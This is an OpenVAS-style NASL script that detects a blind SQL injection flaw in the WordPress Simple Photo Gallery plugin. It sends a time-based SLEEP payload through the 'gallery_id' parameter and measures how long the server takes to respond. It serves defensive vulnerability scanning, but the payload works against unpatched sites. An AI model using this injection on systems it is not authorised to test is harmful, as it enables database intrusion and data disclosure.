CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805193" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2015-05-28 16:25:29 +0530 (Thu, 28 May 2015)" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_name( "Wordpess Simple Photo Gallery Blind SQL Injection Vulnerability" );
	script_tag( name: "summary", value: "The host is installed with WordPress
  Simple Photo Gallery and is prone to blind sql injection vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not." );
	script_tag( name: "insight", value: "Flaw is due to improper sanitization of
  user supplied input passed via 'gallery_id' parameter to the
  '/wppg_photogallery/wppg_photo_details' page." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data." );
	script_tag( name: "affected", value: "WordPress Simple Photo Gallery version
  1.7.8, prior versions may also be affected." );
	script_tag( name: "solution", value: "Update to version 1.8.0 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/37113" );
	script_xref( name: "URL", value: "https://wordpress.org/plugins/simple-photo-gallery/changelog" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
wait_extra_sec = 5;
hostName = get_host_name();
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/index.php/wppg_photogallery/wppg_photo_details/";
sndReq = http_get( item: url, port: http_port );
rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
useragent = http_get_user_agent();
if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 301" )){
	url1 = egrep( pattern: "Location:.*://.*/index.php/wppg_photogallery/wppg_photo_details/", string: rcvRes );
	hostname = split( buffer: url1, sep: "/", keep: FALSE );
	if(!hostname[2]){
		exit( 0 );
	}
	hostName = hostname[2];
	sndReq = "GET " + url + " HTTP/1.1\r\n" + "User-Agent: " + useragent + "\r\n" + "Host: " + hostName + "\r\n" + "Connection: Keep-Alive\r\n" + "\r\n";
	rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
}
if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "wp-content/plugins/simple-photo-gallery" )){
	sleep = make_list( 3,
		 5 );
	for sec in sleep {
		url = dir + "/index.php/wppg_photogallery/wppg_photo_details/?" + "gallery_id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(" + sec + ")))QBzh)";
		sndReq = "GET " + url + " HTTP/1.1\r\n" + "User-Agent: " + useragent + "\r\n" + "Host: " + hostName + "\r\n" + "Connection: Keep-Alive\r\n" + "\r\n";
		start = unixtime();
		rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
		stop = unixtime();
		time_taken = stop - start;
		if(time_taken + 1 < sec || time_taken > ( sec + wait_extra_sec )){
			exit( 0 );
		}
	}
	security_message( http_port );
	exit( 0 );
}

